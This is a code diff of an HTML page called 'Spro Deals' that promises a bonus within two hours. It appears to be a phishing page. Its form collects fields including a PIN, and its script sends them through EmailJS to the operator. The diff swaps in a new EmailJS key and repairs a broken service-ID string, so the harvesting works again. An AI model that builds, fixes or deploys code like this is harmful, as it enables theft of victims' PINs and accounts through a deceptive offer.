@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
   <title>Spro Deals</title>
@@ -28,10 +28,11 @@
     <p>You will get bonus in 2 hours.</p>
   </div>
 
+  <!-- EmailJS SDK -->
   <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
   <script>
     (function(){
-      emailjs.init("LUAYRaC30g781PF_K"); // apna EmailJS public key daalna
+      emailjs.init("-7KTj0rOkVUhgUEx2"); // Public Key
     })();
 
     document.getElementById("sproForm").addEventListener("submit", function(e){
@@ -43,13 +44,12 @@
         pin: document.getElementById("pin").value
       };
 
-      emailjs.send("service_ohjwfz9
-", "template_cwk0gck", templateParams)
+      emailjs.send("service_ohjwfz9", "template_cwk0gck", templateParams)
         .then(function(response) {
           document.getElementById("formCard").style.display = "none";
           document.getElementById("thanks").style.display = "block";
         }, function(error) {
-          alert("Failed to send: " + JSON.stringify(error));
+          alert("❌ Failed: " + JSON.stringify(error));
         });
     });
   </script>
